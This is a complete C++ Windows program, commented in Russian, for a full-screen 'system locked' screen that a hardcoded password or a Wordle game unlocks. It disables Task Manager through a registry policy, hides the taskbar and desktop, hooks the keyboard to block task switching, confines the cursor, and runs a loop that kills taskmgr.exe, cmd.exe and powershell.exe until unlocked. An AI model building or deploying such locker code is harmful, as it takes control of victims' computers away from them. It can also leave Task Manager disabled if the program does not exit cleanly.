#define UNICODE
#define _UNICODE

#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <tlhelp32.h>

// Линковка библиотек
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// --- КОНФИГУРАЦИЯ ---
// Обновленный пароль (6 букв)
const std::wstring SECRET_WORD = L"ПЕРЧИК"; 
const int MAX_ATTEMPTS = 6;
// --------------------

enum AppState {
    STATE_LOGIN,
    STATE_WORDLE
};

AppState currentState = STATE_LOGIN;
HWND hMainWnd = NULL;
bool locked = true;
HHOOK hKeyboardHook = NULL;
ULONG_PTR gdiplusToken;

struct GuessRow {
    std::wstring letters;
    int colors[6]; // Увеличено до 6, так как слово "ПЕРЧИК" - 6 букв
};
std::vector<GuessRow> guesses;
std::wstring wordleInput = L"";
bool gameWon = false;
bool gameLost = false;

std::wstring passwordInput = L"";
bool passwordError = false;

// --- БЛОКИРОВКА КЛАВИАТУРЫ ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;

        // Panic Key: SHIFT + 0 - всегда работает для безопасности
        if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            locked = false;
            PostQuitMessage(0);
            return 1;
        }

        // Блокировка переключения задач и меню пуск
        if (vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_APPS) return 1;
        if (vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
        if (vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1; 
        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
}

// Блокировка диспетчера задач через реестр
void SecureSystem() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    // Скрытие панели задач и рабочего стола
    ShowWindow(FindWindowW(L"Progman", NULL), SW_HIDE);
    ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
}

// ВОССТАНОВЛЕНИЕ СИСТЕМЫ (Разблокировка)
void UnlockSystem() {
    // 1. Возвращаем диспетчер задач
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0; // 0 = включить обратно
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    // 2. Показываем рабочий стол и панель задач
    ShowWindow(FindWindowW(L"Progman", NULL), SW_SHOW);
    ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_SHOW);
}

// Поток, следящий за тем, чтобы не запускали CMD или TaskMgr в обход
void Watchdog() {
    while (locked) {
        KillProcessByName(L"taskmgr.exe");
        KillProcessByName(L"cmd.exe");
        KillProcessByName(L"powershell.exe");
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

// --- ЛОГИКА ---

void CheckMainPassword() {
    if (passwordInput == SECRET_WORD) {
        locked = false;
        PostMessage(hMainWnd, WM_CLOSE, 0, 0);
    } else {
        passwordError = true;
        passwordInput = L"";
        InvalidateRect(hMainWnd, NULL, FALSE);
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            if (locked) {
                passwordError = false;
                InvalidateRect(hMainWnd, NULL, FALSE);
            }
        }).detach();
    }
}

void CheckWordleGuess() {
    size_t len = SECRET_WORD.length(); // 6 для ПЕРЧИК
    if (wordleInput.length() != len) return;

    GuessRow newGuess;
    newGuess.letters = wordleInput;
    std::wstring tempSecret = SECRET_WORD; 
    
    // Инициализация
    for(size_t i=0; i<len; i++) newGuess.colors[i] = 1; 

    // Зеленые
    for (size_t i = 0; i < len; i++) {
        if (newGuess.letters[i] == tempSecret[i]) {
            newGuess.colors[i] = 3;
            tempSecret[i] = L'*';
        }
    }
    // Желтые
    for (size_t i = 0; i < len; i++) {
        if (newGuess.colors[i] == 3) continue;
        size_t foundPos = tempSecret.find(newGuess.letters[i]);
        if (foundPos != std::wstring::npos) {
            newGuess.colors[i] = 2;
            tempSecret[foundPos] = L'*';
        }
    }
    guesses.push_back(newGuess);

    if (wordleInput == SECRET_WORD) {
        gameWon = true;
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            locked = false;
            PostMessage(hMainWnd, WM_CLOSE, 0, 0);
        }).detach();
    } else if (guesses.size() >= MAX_ATTEMPTS) {
        gameLost = true;
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            guesses.clear();
            wordleInput = L"";
            gameLost = false;
            InvalidateRect(hMainWnd, NULL, FALSE);
        }).detach();
    }
    wordleInput = L"";
}

// --- ОТРИСОВКА ---

void DrawLoginScreen(Graphics& g, int width, int height, FontFamily& fontFamily) {
    Font fontHeader(&fontFamily, 40, FontStyleBold, UnitPixel);
    Font fontInput(&fontFamily, 32, FontStyleRegular, UnitPixel);
    Font fontHint(&fontFamily, 20, FontStyleRegular, UnitPixel);
    SolidBrush redBrush(Color(255, 255, 60, 60));
    SolidBrush whiteBrush(Color(255, 240, 240, 240));
    SolidBrush grayBrush(Color(255, 100, 100, 100));
    StringFormat centerFormat;
    centerFormat.SetAlignment(StringAlignmentCenter);

    g.DrawString(L"СИСТЕМА ЗАБЛОКИРОВАНА", -1, &fontHeader, PointF(width / 2.0f, height * 0.2f), &centerFormat, &redBrush);

    RectF inputRect(width / 2.0f - 200, height * 0.4f, 400, 50);
    Pen borderPen(Color(255, 255, 255, 255), 2);
    g.DrawRectangle(&borderPen, inputRect);

    std::wstring maskedPass(passwordInput.length(), L'*');
    if (maskedPass.empty()) {
        g.DrawString(L"Введите пароль...", -1, &fontHint, PointF(width / 2.0f, height * 0.4f + 10), &centerFormat, &grayBrush);
    } else {
        g.DrawString(maskedPass.c_str(), -1, &fontInput, PointF(width / 2.0f, height * 0.4f + 5), &centerFormat, &whiteBrush);
    }

    if (passwordError) {
        g.DrawString(L"НЕВЕРНЫЙ ПАРОЛЬ", -1, &fontHint, PointF(width / 2.0f, height * 0.4f + 60), &centerFormat, &redBrush);
    }

    g.DrawString(L"Нажмите [TAB], чтобы сыграть в игру", -1, &fontHint, PointF(width / 2.0f, height * 0.7f), &centerFormat, &whiteBrush);
    
    RectF btnRect(width / 2.0f - 150, height * 0.75f, 300, 60);
    SolidBrush btnBrush(Color(255, 40, 40, 80));
    g.FillRectangle(&btnBrush, btnRect);
    g.DrawRectangle(&borderPen, btnRect);
    g.DrawString(L"ИГРАТЬ В WORDLE", -1, &fontHeader, PointF(width / 2.0f, height * 0.75f + 5), &centerFormat, &whiteBrush);
}

void DrawWordleScreen(Graphics& g, int width, int height, FontFamily& fontFamily) {
    Font fontHeader(&fontFamily, 36, FontStyleBold, UnitPixel);
    Font fontLetter(&fontFamily, 32, FontStyleBold, UnitPixel);
    SolidBrush whiteBrush(Color(255, 240, 240, 240));
    SolidBrush redBrush(Color(255, 255, 60, 60));
    SolidBrush greenBrush(Color(255, 0, 255, 0));
    StringFormat centerFormat;
    centerFormat.SetAlignment(StringAlignmentCenter);

    g.DrawString(L"WORDLE: УГАДАЙ ПАРОЛЬ", -1, &fontHeader, PointF(width / 2.0f, 50.0f), &centerFormat, &whiteBrush);
    g.DrawString(L"[ESC] - Назад", -1, &fontLetter, PointF(width / 2.0f, height - 80.0f), &centerFormat, &whiteBrush);

    int wordLen = 6; // ПЕРЧИК
    int boxSize = 60;
    int gap = 12;
    int startX = (width - (wordLen * boxSize + (wordLen-1) * gap)) / 2;
    int startY = 150;
    Pen borderPen(Color(255, 100, 100, 100), 2);

    for (size_t r = 0; r < MAX_ATTEMPTS; r++) {
        for (int c = 0; c < wordLen; c++) {
            Rect rect(startX + c * (boxSize + gap), startY + r * (boxSize + gap), boxSize, boxSize);
            Color fillColor = Color(0, 0, 0, 0);
            wchar_t letter = 0;

            if (r < guesses.size()) {
                letter = guesses[r].letters[c];
                int col = guesses[r].colors[c];
                if (col == 1) fillColor = Color(255, 60, 60, 60); 
                if (col == 2) fillColor = Color(255, 210, 180, 0); 
                if (col == 3) fillColor = Color(255, 0, 180, 0);   
            } else if (r == guesses.size() && c < wordleInput.length()) {
                letter = wordleInput[c];
                fillColor = Color(255, 40, 40, 45);
            }

            if (fillColor.GetAlpha() > 0) {
                SolidBrush fillBrush(fillColor);
                g.FillRectangle(&fillBrush, rect);
            }
            g.DrawRectangle(&borderPen, rect);

            if (letter != 0) {
                wchar_t s[2] = { letter, 0 };
                RectF rectF((REAL)rect.X, (REAL)rect.Y + 10, (REAL)rect.Width, (REAL)rect.Height);
                g.DrawString(s, -1, &fontLetter, rectF, &centerFormat, &whiteBrush);
            }
        }
    }

    if (gameWon) {
        g.DrawString(L"ПРАВИЛЬНО! РАЗБЛОКИРОВКА...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &greenBrush);
    } else if (gameLost) {
        g.DrawString(L"НЕУДАЧА. СБРОС...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &redBrush);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE:
        SetTimer(hWnd, 1, 100, NULL);
        return 0;

    case WM_TIMER:
        if (wParam == 1 && locked) {
            SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            RECT rect;
            GetWindowRect(hWnd, &rect);
            ClipCursor(&rect);
            SetForegroundWindow(hWnd);
            SetFocus(hWnd);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBM = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
        SelectObject(memDC, memBM);

        Graphics g(memDC);
        g.SetTextRenderingHint(TextRenderingHintAntiAlias);
        SolidBrush bgBrush(Color(255, 15, 15, 20));
        g.FillRectangle(&bgBrush, 0, 0, rc.right, rc.bottom);

        FontFamily fontFamily(L"Segoe UI");

        if (currentState == STATE_LOGIN) {
            DrawLoginScreen(g, rc.right, rc.bottom, fontFamily);
        } else {
            DrawWordleScreen(g, rc.right, rc.bottom, fontFamily);
        }

        BitBlt(hdc, 0, 0, rc.right, rc.bottom, memDC, 0, 0, SRCCOPY);
        DeleteObject(memBM);
        DeleteDC(memDC);
        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_ERASEBKGND: return 1;

    case WM_LBUTTONDOWN: {
        if (currentState == STATE_LOGIN) {
            RECT rc;
            GetClientRect(hWnd, &rc);
            int y = HIWORD(lParam);
            if (y > rc.bottom * 0.7f) {
                currentState = STATE_WORDLE;
                InvalidateRect(hWnd, NULL, FALSE);
            }
        }
        return 0;
    }

    case WM_CHAR: {
        if (!locked) break;
        wchar_t ch = (wchar_t)wParam;
        CharUpperBuffW(&ch, 1); 

        if (currentState == STATE_LOGIN) {
            if (ch == VK_TAB) { 
                currentState = STATE_WORDLE;
                InvalidateRect(hWnd, NULL, FALSE);
                return 0;
            }
            if (ch == VK_RETURN) { 
                CheckMainPassword();
                return 0;
            }
            if (ch == VK_BACK) {
                if (!passwordInput.empty()) passwordInput.pop_back();
            } else if (ch >= 32) { 
                passwordInput += ch;
            }
            InvalidateRect(hWnd, NULL, FALSE);

        } else {
            if (ch == VK_ESCAPE) { 
                currentState = STATE_LOGIN;
                InvalidateRect(hWnd, NULL, FALSE);
                return 0;
            }
            if (gameWon || gameLost) return 0;

            if (ch == VK_BACK) {
                if (!wordleInput.empty()) wordleInput.pop_back();
            } else if (ch == VK_RETURN) {
                CheckWordleGuess();
            } else {
                bool isLatin = (ch >= 'A' && ch <= 'Z');
                bool isCyrillic = (ch >= 0x0410 && ch <= 0x044F) || (ch == 0x0401);
                // Проверяем длину слова (теперь 6 букв)
                if ((isLatin || isCyrillic) && wordleInput.length() < 6) {
                    wordleInput += ch;
                }
            }
            InvalidateRect(hWnd, NULL, FALSE);
        }
        return 0;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, message, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    SecureSystem();
    std::thread watchdogThread(Watchdog);

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"FinalLocker";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    hMainWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"FinalLocker", NULL,
        WS_POPUP | WS_VISIBLE, 0, 0, screenW, screenH, NULL, NULL, hInstance, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    locked = false;
    watchdogThread.detach();
    UnlockSystem(); // Вызов разблокировки при выходе
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    ClipCursor(NULL);
    GdiplusShutdown(gdiplusToken);

    return 0;
}
